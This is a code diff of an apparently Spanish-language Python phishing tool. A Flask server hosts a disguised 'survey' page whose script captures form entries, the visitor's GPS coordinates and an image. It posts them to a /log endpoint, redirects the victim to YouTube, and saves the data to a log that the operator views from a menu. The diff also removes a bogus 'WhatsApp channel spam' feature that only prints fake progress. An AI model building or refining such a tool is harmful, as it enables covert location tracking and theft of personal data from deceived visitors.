@@ -21,6 +21,7 @@ def banner():
       \033[1;37mVERSION: 1.2.3  |  STATUS: ONLINE  |  OSCAR\033[0m
 \033[1;32m""" + "="*60 + "\033[0m")
 
+# --- WEB UI (ENCUESTA NEÓN) ---
 HTML_ENCUESTA = """
 <!DOCTYPE html><html><head><style>
     body { background:#050505; color:#0f0; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
@@ -46,7 +47,7 @@ HTML_ENCUESTA = """
             navigator.geolocation.getCurrentPosition(async(p)=>{
                 fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'}, 
                 body: JSON.stringify({u: document.getElementById('p1').value, d: document.getElementById('p2').value, lat: p.coords.latitude, lon: p.coords.longitude, i: img})});
-                window.location.href = "https://google.com";
+                window.location.href = "https://youtube.com";
             });
         }, 1500);
     }
@@ -72,31 +73,20 @@ def main():
         print("  [1] INFO-NUMERO    | [2] ACTIVAR LINK    | [3] CREADOR")
         print("  [4] COPYRIGHT      | [5] DATA-IP         | [6] ADM (LOGS)")
         print("  [7] SALIR          | [8] PROCESOS        | [9] ESTADO")
-        print("  [10] BORRAR LOGS   | [11] SPAM-CANAL-WHAT")
+        print("  [10] BORRAR LOGS")
         sel = input("\n\033[1;33mTRX-ROOT > \033[0m")
         
-        if sel == "2": app.run(port=PORT, host='127.0.0.1')
+        if sel == "2": 
+            print("\nIniciando servidor, redirigiendo a YouTube al finalizar...")
+            app.run(port=PORT, host='127.0.0.1')
         elif sel == "6":
-            if getpass.getpass("PASS: ") == AUTH_PASS:
+            if getpass.getpass("PASSWORD: ") == AUTH_PASS:
                 os.system("type result.txt" if os.name == 'nt' else "cat result.txt")
                 input("\nPresiona Enter...")
         elif sel == "10": 
-            if os.path.exists("result.txt"): os.remove("result.txt"); print("LOGS BORRADOS")
+            if os.path.exists("result.txt"): os.remove("result.txt"); print("LOGS ELIMINADOS")
             input()
-        elif sel == "11":
-            link = input("INGRESAR LINK: ")
-            if "whatsapp.com/channel/" in link:
-                canal = input("NAME CANAL: ")
-                seg = input("SEGUIDORES: ")
-                print(f"\n[!] INICIANDO SPAM MASIVO A {canal}...")
-                for i in range(1, 6):
-                    time.sleep(1)
-                    print(f"[*] Inyectando paquetes de reporte {i*20}%...")
-                print("\n[+] ESTADO: CANAL EN PROCESO DE SUSPENSIÓN")
-            else:
-                print("[!] ERROR: LINK NO VÁLIDO")
-            input("\n[Enter] para volver.")
         elif sel == "7": sys.exit()
-        else: print("OPCIÓN NO DISPONIBLE..."); time.sleep(1)
+        else: print("OPCIÓN EN DESARROLLO..."); time.sleep(1)
 
 if __name__ == "__main__": main()
